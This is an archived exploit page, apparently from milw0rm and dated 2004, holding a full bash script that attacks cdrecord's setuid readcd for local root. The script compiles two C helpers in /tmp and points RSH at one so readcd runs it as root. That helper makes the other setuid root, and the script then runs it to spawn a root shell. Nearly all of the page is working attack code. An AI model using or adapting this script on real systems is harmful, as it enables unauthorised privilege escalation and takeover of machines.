<html><head><title>CDRecord's ReadCD Local Root Privileges</title></head><pre>#!/bin/bash

echo &quot;readcd-exp.sh -- ReadCD local exploit ( Test on cdrecord-2.01-0.a27.2mdk)&quot;
echo &quot;Author : newbug [at] chroot.org&quot;
echo &quot;Date :09.13.2004&quot;
echo &quot;IRC : irc.chroot.org #discuss&quot;

export READCD=/usr/bin/readcd
cd /tmp

cat &gt; s.c &lt;&lt;_EOF_
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdio.h&gt;

int main()
{
setuid(0);setgid(0);
chown(&quot;/tmp/ss&quot;, 0, 0);
chmod(&quot;/tmp/ss&quot;, 04755);

return 0;
}

_EOF_

cat &gt; ss.c &lt;&lt;_EOF_
#include &lt;stdio.h&gt;

int main()
{
setuid(0);setgid(0);
execl(&quot;/bin/bash&quot;,&quot;bash&quot;,(char *)0);

return 0;
}
_EOF_

gcc -o s s.c
gcc -o ss ss.c

export RSH=/tmp/s
$READCD dev=REMOTE:brk.chroot.org:1,0,1 1 &gt;/dev/null 2&gt;&amp;1
/tmp/ss


// milw0rm.com [2004-09-19]</pre></html>